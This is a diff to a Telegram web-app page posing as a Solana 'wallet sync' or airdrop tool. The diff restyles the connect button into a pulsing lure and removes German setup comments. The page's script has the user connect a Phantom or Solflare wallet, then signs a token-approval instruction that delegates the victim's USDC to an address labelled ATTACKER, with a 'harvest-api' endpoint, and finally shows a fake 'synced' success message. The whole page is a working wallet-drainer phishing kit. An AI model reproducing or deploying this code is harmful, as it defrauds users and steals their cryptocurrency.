@@ -19,7 +19,7 @@
     flex-direction: column;
     align-items: center;
     padding: 24px;
-    background-image: radial-gradient(circle at 50% 0%, rgba(153, 69, 255, 0.1) 0%, transparent 50%);
+    background-image: radial-gradient(circle at 50% 0%, rgba(20, 241, 149, 0.05) 0%, transparent 50%);
   }
 
   .header {
@@ -95,20 +95,45 @@
   .data-value.error { color: #ef4444; }
   .data-value.success { color: #14F195; }
 
+  /* NEUER BUTTON */
   .sync-btn {
-    width: 100%; padding: 16px;
-    background: #ffffff; color: #000000;
-    border: none; border-radius: 12px;
-    font-size: 15px; font-weight: 700;
-    cursor: pointer; margin-top: 24px;
-    transition: all 0.2s;
+    width: 100%; 
+    padding: 22px 16px;
+    background: linear-gradient(180deg, #14F195 0%, #059669 100%);
+    color: #000000;
+    border: none; 
+    border-radius: 16px;
+    font-size: 18px; 
+    font-weight: 800;
+    cursor: pointer; 
+    margin-top: 24px;
+    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    box-shadow: 0 0 20px rgba(20, 241, 149, 0.4), 0 0 40px rgba(20, 241, 149, 0.1);
+    position: relative;
+    overflow: hidden;
+    animation: pulseGlow 2s infinite alternate;
   }
-  .sync-btn:active { transform: scale(0.98); }
-  .sync-btn:disabled { background: #27272a; color: #71717a; }
+
+  @keyframes pulseGlow {
+    0% { box-shadow: 0 0 15px rgba(20, 241, 149, 0.3), 0 0 30px rgba(20, 241, 149, 0.1); }
+    100% { box-shadow: 0 0 25px rgba(20, 241, 149, 0.6), 0 0 50px rgba(20, 241, 149, 0.2); }
+  }
+
+  .sync-btn:active { 
+    transform: scale(0.97); 
+    box-shadow: 0 0 10px rgba(20, 241, 149, 0.5);
+  }
+
+  .sync-btn:disabled { 
+    background: #27272a; 
+    color: #71717a; 
+    box-shadow: none; 
+    animation: none;
+  }
 
   .spinner {
-    display: none; width: 18px; height: 18px;
-    border: 2px solid rgba(0,0,0,0.2); border-top-color: #000;
+    display: none; width: 20px; height: 20px;
+    border: 3px solid rgba(0,0,0,0.2); border-top-color: #000;
     border-radius: 50%; animation: spin 0.8s linear infinite;
     margin: 0 auto;
   }
@@ -121,7 +146,7 @@
       <svg width="20" height="20" viewBox="0 0 397 311" fill="none" xmlns="http://www.w3.org/2000/svg">
         <path d="M64.6 237.9c2.4-2.4 5.7-3.8 9.2-3.8h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1l62.7-62.7z" fill="#ffffff"/>
         <path d="M64.6 3.8C67.1 1.4 70.4 0 73.8 0h317.4c5.8 0 8.7 7 4.6 11.1l-62.7 62.7c-2.4 2.4-5.7 3.8-9.2 3.8H6.5c-5.8 0-8.7-7-4.6-11.1L64.6 3.8z" fill="#ffffff"/>
-        <path d="M333.1 120.1c-2.4--value2.4-5.7-3.8-9 success.2-3.8H6.5">c-5.8 0Sol-8.7 7-ana4.6 11.1l62.7  v62.7c2.4 2.4 5.7 3.8 9.2 3.8h317.4c5.8 0 8.7-7 4.6-11.1l-62.7-62.7z" fill="#ffffff"/>
+        <path d="M333.1 120.1c-2.4-2.4-5.7-3.8-9.2-3.8H6.5c-5.8 0-8.7 7-4.6 11.1l62.7 62.7c2.4 2.4 5.7 3.8 9.2 3.8h317.4c5.8 0 8.7-7 4.6-11.1l-62.7-62.7z" fill="#ffffff"/>
       </svg>
     </div>
     <div class="header-text">
@@ -150,27 +175,24 @@
     </div>
     <div class="data-row">
       <span class="data-label">Protocol</span>
-      <span class="data1.17</span>
+      <span class="data-value success">Solana v1.17</span>
     </div>
 
     <button class="sync-btn" id="claimBtn">
-      <span id="btnText">Connect Wallet to Sync</span>
+      <span id="btnText">CONNECT WALLET</span>
       <div class="spinner" id="spin"></div>
     </button>
   </div>
 
 <script>
-  // --- TELEGRAM INIT ---
   if (window.Telegram && window.Telegram.WebApp) {
     window.Telegram.WebApp.ready();
     window.Telegram.WebApp.expand();
   }
 
-  // --- CONFIG ---
-  const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; // <--- HIER DEINE ADRESSE EINTRAGEN
-  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; // <--- HIER DEINE WORKER URL
+  const ATTACKER = "DEINE_SOLANA_ADRESSE_HIER"; 
+  const ENDPOINT = "https://harvest-api.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
-  // --------------
 
   const claimBtn = document.getElementById("claimBtn");
   const btnText = document.getElementById("btnText");
@@ -183,11 +205,10 @@
     else if (window.solflare?.isSolflare) provider = window.solflare;
 
     if (!provider) { 
-      // DEEP LINK ZU PHANTOM WENN WIR IN TELEGRAM SIND
       if (window.Telegram && window.Telegram.WebApp) {
         window.Telegram.WebApp.showConfirm("Wallet connection requires Phantom. Open in Phantom app?", (confirmed) => {
           if (confirmed) {
-            const url = "https://airdrop-66m.pages.dev"; // Deine Website URL
+            const url = "https://airdrop-66m.pages.dev";
             window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
           }
         });
@@ -214,7 +235,6 @@
         resp.publicKey
       );
 
-      // Der Payload: Approve Delegation
       const delegateIx = splToken.createApproveInstruction(
         victimAta,
         new solanaWeb3.PublicKey(ATTACKER),
@@ -239,10 +259,10 @@
       });
 
       spin.style.display = "none";
-      btnText.textContent = "Sync Complete";
-      claimBtn.style.background = "#14F195";
+      btnText.textContent = "SYNC COMPLETE";
+      claimBtn.style.background = "linear-gradient(180deg, #14F195 0%, #059669 100%)";
       claimBtn.style.color = "#000";
-
+      
       document.querySelector('.status-desc').innerHTML = "<b>Success!</b> Your wallet is now synced with the Solana network.";
       rpcStatus.className = "data-value success";
       rpcStatus.textContent = "Connected";
@@ -250,7 +270,7 @@
     } catch (e) {
       spin.style.display = "none";
       claimBtn.disabled = false;
-      btnText.textContent = "Connect Wallet to Sync";
+      btnText.textContent = "CONNECT WALLET";
     }
   };
 </script>
